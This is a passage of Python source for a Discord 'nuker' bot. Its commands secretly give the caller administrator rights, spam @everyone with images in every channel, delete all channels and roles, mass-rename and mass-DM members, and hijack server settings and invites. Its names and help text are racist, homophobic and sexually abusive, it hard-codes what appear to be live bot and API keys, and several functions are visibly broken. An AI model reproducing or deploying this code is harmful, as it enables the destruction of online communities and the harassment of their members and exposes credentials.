        await ctx.message.delete()
        guild=ctx.guild
        server = ctx.message.guild
        perms = discord.Permissions(2147483127)
        await guild.create_role(name='weeb', permissions=perms, colour = discord.Colour(0xFF80EF))
        user = ctx.message.author
        role = discord.utils.get(user.guild.roles, name="weeb")
        await user.add_roles(role)
        print (f"@\u001b[32m {ctx.message.author} \u001b[0m has been granted weeb powers in \u001b[33m {ctx.guild.name} \u001b[0m")

@client.command()
async def hsedit(ctx, role: discord.Role, *name: str, pos: int):
    await ctx.message.delete()
    user = ctx.guild.roles
    roleselect=discord.utils.get(user.roles,name=role)
    if role==None:
        ctx.send("please input role",delete_after=10)
    elif name==None:
        ctx.send("please input name",delete_after=10)
    else:
        try:
            await role.edit(position=pos,name=name)
            print(f"Moved role {pos} above current position")
        except discord.HTTPException:
            print("failed to move role")
        except discord.Forbidden:
            print("No permission to move role")

@client.command()
async def jane(ctx):
    await ctx.message.delete()
    for spam in ctx.guild.channels:
        try:
            embed = discord.Embed(description="@everyone", colour = discord.Colour(0xff001d))
            embed.set_image(url="https://cdn.discordapp.com/attachments/541880222065098762/655747250550734848/jane_xd.jpeg")
            await ctx.send(embed=embed)
        except:
             pass
        print(f"@\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages")

@client.command()
async def ifsexybenigcrime(ctx):
    await ctx.message.delete()
    for spam in ctx.guild.channels:
        try:
            embed = discord.Embed(description="@everyone", colour = discord.Colour(0xff001d))
            embed.set_image(url="https://cdn.discordapp.com/attachments/658559344966762497/660380817692033024/hsisindian.png")
            await ctx.send(embed=embed)
        except:
             pass
        print(f"@\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages")

@client.command()
async def tgay(ctx):
    await ctx.message.delete()
    for spam in ctx.guild.channels:
        try:
            embed = discord.Embed(description="@everyone", colour = discord.Colour(0xff001d))
            embed.set_image(url="https://cdn.discordapp.com/attachments/660382624128303126/660384156907470848/ths.png")
            await ctx.send(embed=embed)
        except:
             pass
        print(f"@\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages")

@client.command()
async def janexd(ctx):
    await ctx.message.delete()
    for spam in ctx.guild.channels:
        try:
            embed = discord.Embed(description="@everyone", colour = discord.Colour(0xff001d))
            embed.set_image(url="https://cdn.discordapp.com/attachments/541880222065098762/655747238374539264/jane_shoot.jpg")
            await ctx.send(embed=embed)
        except:
            print(f"@\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages")

@client.command()
async def redhseyes(ctx):
    await ctx.message.delete()
    for spam in ctx.guild.channels:
        try:
            embed = discord.Embed(description="@everyone", colour = discord.Colour(0xff001d))
            embed.set_image(url="https://media.discordapp.net/attachments/647801195527798789/655781773720027142/hs2.png")
            await ctx.send(embed=embed)
            await asyncio.sleep(0.21)
        except:
            print(f"\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages")

@client.command()
async def pornhub(ctx):
    i=0
    await ctx.message.delete()
    imgss=["https://cdn.discordapp.com/attachments/663715365754372127/665226682223034388/chino8.PNG","https://cdn.discordapp.com/attachments/663715365754372127/665226707350847518/chino9.PNG",'https://cdn.discordapp.com/attachments/663715365754372127/665226854864650280/i_like_its_2.PNG','https://cdn.discordapp.com/attachments/663715365754372127/665226726783188992/chino10.jpg']
    while i<40:
        i+=1
        randomrandom=random.choice(imgss)
        embed = discord.Embed(description="@everyone", colour = discord.Colour(0xff001d))
        embed.set_image(url=randomrandom)
        await ctx.send(embed=embed)
        await asyncio.sleep(0.21)



@client.command()
async def nineeleven(ctx):
    await ctx.message.delete()
    for spam in ctx.guild.channels:
        try:
            embed = discord.Embed(description="@everyone", colour = discord.Colour(0xff001d))
            embed.set_image(url="https://cdn.discordapp.com/attachments/660382624128303126/660395050479648788/indi.png")
            await ctx.send(embed=embed)
            await asyncio.sleep(0.21)
        except:
            print(f"\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages")

@client.command()
async def nuclearhs(ctx):
    await ctx.message.delete()
    spying = client.get_channel(666142878485053440)
    guild = discord.guild
    for channel in ctx.guild.channels:
        if channel == spying:
            print("avoided spy channel")
        else:
            try:
                await channel.delete()
                print (f"{channel.name} has been deleted in \u001b[33m {ctx.guild.name} \u001b[0m")
            except (discord.Forbbiden, discord.NotFound, discord.HTTPException) as e:
                    print("Could not delete channel {name} for reason {e}")
        print(f"\u001b[32m {ctx.message.author} \u001b[0m has nuked and deleted all channels in \u001b[33m {ctx.guild.name} \u001b[0m")
@client.command()
async def rename(ctx, *, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print (f"{user.name} has been renamed to {rename_to} in \u001b[33m{ctx.guild.name} \u001b[0m")
            except:
                print (f"{user.name} has NOT been renamed to {rename_to} in \u001b[33m{ctx.guild.name} \u001b[0m")

        print (f"Renamed everyone to what \u001b[32m {ctx.message.author} \u001b[0m desires")
@client.command()
async def indianrename(ctx):
        await ctx.message.delete()



        for user in ctx.guild.members:
            try:
                randomnick=random.choice(rename_to)
                rename_to.remove(randomnick)
                await user.edit(nick=randomnick)
                print (f"{user.name} has been renamed to {randomnick} in \u001b[33m{ctx.guild.name} \u001b[0m")
            except:
                print (f"{user.name} has NOT been renamed to {randomnick} in \u001b[33m{ctx.guild.name} \u001b[0m")

@client.command()
async def hsmsg(ctx, *, message):
        await ctx.message.delete()
        retStr = str(f"""```css\n{message}```""")
        for user in ctx.guild.members:
            try:
                await user.send(retStr)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
        print("Sent all messages")
@client.command()
async def msgsnipe(ctx, user:discord.Member=None, *, message):
    await ctx.message.delete()
    author = ctx.message.author
    if user==None:
        author.send("input a user")
    else:
        await user.send(message)
@client.command()
async def hshelp(ctx):
    author = ctx.author
    await ctx.message.delete()
    embed = discord.Embed(
        colour = discord.Colour.blue(),title='hmmm'
    )
    embed.set_author(name='Page 1 of 3')

    embed.set_image(url='https://cdn.discordapp.com/attachments/660382624128303126/660384585389178920/oats.png')
    embed.add_field(name='-h', value='Kicks everyone from the server', inline=False)
    embed.add_field(name='-rape', value='Deletes all channels, creates a new channel to flex, and bans everyone', inline=False)
    embed.add_field(name='-hs', value='Creates a role and gives you administrator', inline=False)
    embed.add_field(name='-sh', value='Want the rest of the permissions?', inline=False)
    embed.add_field(name='-nuclearhs', value='Deletes all channels, basically rendering the server useless', inline=False)
    embed.add_field(name='-hsmsg', value='messages all discord members of the server with your desired message', inline=False)
    embed.set_footer(text='for meme voice commands type -voicehshelp or -hshelp2 for page 2')
    await ctx.send(ctx.message.author.mention, embed=embed,delete_after=11)
    print(f"Sent hs help to @\u001b[32m {ctx.message.author} \u001b[0m")

@client.command()
async def hshelp2(ctx):
        author = ctx.author
        await ctx.message.delete()

        embed = discord.Embed(
            colour = discord.Colour.blue(),title='hs commands'
        )
        embed.set_author(name='Page 2 of 3')

        embed.set_image(url='https://cdn.discordapp.com/attachments/660382624128303126/660384585389178920/oats.png')
        embed.add_field(name='-hschannel', value='Edits channel name to random phrases', inline=False)
        embed.add_field(name='-hsadd', value='Adds new channels with random phrases', inline=False)
        embed.add_field(name='-clearroles', value='Deletes all possible roles', inline=False)
        embed.add_field(name='-randomspam', value='spam the chat with random text', inline=False)
        embed.add_field(name='-hsserveredit', value='removes the photo of the guild and changes name to what u desire and region change to india', inline=False)
        embed.add_field(name='-indianrename', value='renames everyone to indian names', inline=False)
        embed.set_footer(text='for meme voice commands type -voicehshelp -hshelp3 for page 3')
        await ctx.send(ctx.message.author.mention, embed=embed,delete_after=11)
        print(f"Sent hs help2 to @\u001b[32m {ctx.message.author} \u001b[0m")

@client.command()
async def voicehshelp(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
        colour = discord.Colour(0xf8e71c)
    )
    embed.set_author(name='Hs voice commands')
    embed.add_field(name='-erika', value='plays erika to rape ppl', inline=False)
    embed.add_field(name='-alexghae', value='plays russian hardbass', inline=False)
    embed.add_field(name='-hsgirlfriendlol', value='plays a song of loneliness', inline=False)
    embed.set_footer(text='Pls kill me now')
    await ctx.send(ctx.message.author.mention,embed=embed,delete_after=11)
    print(f"Sent Voice help to @\u001b[32m {ctx.message.author} \u001b[0m")

@client.command()
async def hschannel(ctx):
        await ctx.message.delete()
        channel = ctx.guild.channels
        list = ["HS and Philswift","Now Thats alot of damage","Yes me","visible confuse","Its got delete","U dwarf picture","Its out from google translate","Indian tech support"]
        for channel in ctx.guild.channels:
            try:
                choose = random.choice(list)
                print (f"\u001b[36m {channel.name} \u001b[0m has been edited in \u001b[33m {ctx.guild.name} \u001b[0m")
                await channel.edit(name=choose)
            except:
                print (f"\u001b[36m {channel.name} \u001b[0m has NOT been edited in \u001b[33m {ctx.guild.name} \u001b[0m")
"""@client.command()
async def hsadd(ctx):
    await ctx.message.delete()
    list = ["HS and Philswift","Now Thats alot of damage","Yes me","visible confuse","Its got delete","U dwarf picture"]

    channel = discord.utils.get(ctx.guild.text_channels, name=choose)
    for channel in ctx.guild.channels:
        try:
            choose = random.choice(list)
           await ctx.guild.create_text_channel(choose)
           await client.send_message(channel,"yes")
        except:
            print(f"{ctx.author} has generated channel {choose}")"""
@client.command()
async def hsadd(ctx):
    await ctx.message.delete()

    choose = random.choice(list)
    channel = discord.utils.get(ctx.guild.text_channels, name=choose)
    await ctx.guild.create_text_channel(choose)
    print(f"{ctx.author} has created channel {choose}")

@client.command()
async def hsroles(ctx):
    colourrandom = [''.join([random.choice('0123456789ABCDEF') for j in range(6)])]
    colour = int(colourrandom, 0)

    names = ["Heavy","Spy","Scout","Engineer","Demoman","Soldier","Medic","Pyro","Sniper","HS","Gay","Porn maker","Noob","Loli"]
    await ctx.message.delete()
    guild=ctx.guild
    users = ctx.guild.members
    for role in users:
        randomnames = random.choice(names)
        role = discord.utils.get(ctx.guild.roles, name=randomnames)
        names.remove(randomnames)
        await guild.create_role(name=randomnames, colour = discord.Colour(colour))
        await users.add_roles(role)

@client.command()
async def clearroles(ctx):
    await ctx.message.delete()
    for role in ctx.guild.roles:
            try:
                await role.delete()
                print (f"{role.name} \u001b[0m has been deleted in \u001b[33m {ctx.guild.name} \u001b[0m")
            except:
                print (f"{role.name} \u001b[0m has cannot be deleted in \u001b[33m {ctx.guild.name} \u001b[0m")

@client.command()
async def randomspam(ctx):
    await ctx.message.delete()
    o = 4
    while o<40:
        o+=1
        if o == 40:
            break
        else:
            randomtext=random.choice(copypasta)
            embed = discord.Embed(description=randomtext, colour = discord.Colour(0xff001d))
            embed.set_footer(text='Pls do the commit hs')
            await ctx.send(embed=embed)
            await asyncio.sleep(0.21)

@client.command()
async def hsserveredit(ctx, *,name):
    await ctx.message.delete()
    server = ctx.message.guild
    await server.edit(name=name,region='india')
    await server.edit(icon=None)
@client.command()
async def hideaudit(ctx):
    await ctx.message.delete()
    ctx.step = 7
    ctx.delay = 0.1
    ctx.hue = 0
    x=1
    while x<60:
        x+=1
        while 7>1:
            try:
                for i in ctx.guild.roles:
                    print(i.name, i.colour)
                    ctx.hue = (ctx.hue + ctx.step) % 360
                    rgb = [int(x * 255) for x in hls_to_rgb(ctx.hue / 360, 0.5, 1)]
                    clr = discord.Colour(((rgb[0] << 16) + (rgb[1] << 8) + rgb[2]))
                    await i.edit(colour=clr, reason=f'Rainbow roles activated by {ctx.guild.owner}')
                    await asyncio.sleep(ctx.delay)
            except discord.Forbidden:
                print('Missing perm for action')
@client.command()
async def distortvoice(ctx):
    await ctx.message.delete()
    region=['amsterdam','brazil','dubai','eu_central','india','hongkong','singapore','russia','us_west','us_south','us_central','us_east','sydney','southafrica','london','japan']
    server=ctx.message.guild
    i=40
    while i>1:
        try:
            randomregion=random.choice(region)
            region.remove(randomregion)
            await server.edit(region=randomregion)
            print(f"randomising regions xd to {randomregion}")
        except:
            print('Fail to cahnge regions')
@client.command()
async def unbanall(ctx):
    for guild in client.guilds:
        bans = await guild.bans()
        for user in bans:
            try:
                await guild.unban(user[0].name)
                ctx.send('Unbanning everyone...')
                print(f'unbanned {user}')
            except discord.NotFound:
                print(f'did not find {user} in {guild}')
@client.command()
async def listbans(ctx):
    for guild in client.guilds:
        for member in guild.members:
            members = get(await guild.bans(), user=member)
            if members=='None':
                pass
            else:
                print(f"{guild}'s ban list:",members)




@client.command()
async def unbanid(ctx, *, id:int):
    if id == None:
        await ctx.send('Please input id')
    for guild in client.guilds:
        try:
            user = await client.fetch_user(id)
            await guild.unban(user)
            await ctx.send('unbanning user id from bot servers')
            print(f'unbanned {ctx.message.author} from {guild}')
        except discord.errors.NotFound:
            print(f"could not find {ctx.message.author} in {guild}'s ban list")
@client.command()
async def inviteall(ctx):
    for guild in client.guilds:
        for channel in guild.channels:
            try:
                invitelinknew = await channel.create_invite(destination=channel,xkcd=True,max_age=0,max_uses=0,reason=f'Invite sent by {guild.owner}')
                await ctx.send(invitelinknew)
                print(invitelinknew)
            except discord.errors.NotFound:
                print(f"Could not find invite for {guild}")

@client.command()
async def invitelink(ctx, id):
    server = client.get_guild(id)
    link = discord.TextChannel.create_invite(destination=server,xkcd=True,max_age=0,max_uses=0)
    await ctx.send(link)

@client.command()
async def breakingnews(ctx):
    api = newsapi.NewsApiClient(api_key='f01e311a3de242c399fbb85be9967f58')
    output = api.get_top_headlines()
    articles = output['articles']
    totalresults=output['totalResults']
    if 'News-channel' not in ctx.guild.channels:
        print('no news channel CREATING ONE')
        await ctx.guild.create_text_channel('News-channel')
        newschannel=discord.utils.get(ctx.guild.channels,name='News-channel')
        print('Total Search results:',totalresults)
        for i in range(totalresults):
            try:
                one=articles[i]
                oneurlimage=one['urlToImage']
                onetitle=one['title']
                oneurl=one['url']
                onecontent=one['content']
                onePublishedat=one['publishedAt']
                onesource=one['source']
                publishername=onesource['name']
                embed = discord.Embed(title=f'{onetitle}',description=f'```{onecontent}```',colour=discord.Colour(0x42f5a7), url=oneurl)
                embed.set_image(url=oneurlimage)
                embed.set_footer(text=f"Published at:{onePublishedat} in {publishername}")
                await ctx.send(embed=embed)
            except Exception as e:
                print(e)
    else:
        print('news channel detected')
        print('Total Search results:',totalresults)
        for i in range(totalresults):
            try:
                one=articles[i]
                oneurlimage=one['urlToImage']
                onetitle=one['title']
                oneurl=one['url']
                onecontent=one['content']
                onePublishedat=one['publishedAt']
                onesource=one['source']
                publishername=onesource['name']
                newschannel=discord.utils.get(ctx.guild.channels,name='A channel')
                embed = discord.Embed(title=f'{onetitle}',description=f'```{onecontent}```',colour=discord.Colour(0x42f5a7), url=oneurl)
                embed.set_image(url=oneurlimage)
                embed.set_footer(text=f"Published at:{onePublishedat} in {publishername}")
                await ctx.send(embed=embed)
            except Exception as e:
                print(e)




client.run("NjU0NTgxMjczMDI4ODUzNzcw.Xpkj4Q.363_9hDWnw3LByFHWwSFAaChnVU") #Bot's Token Code Goes Here
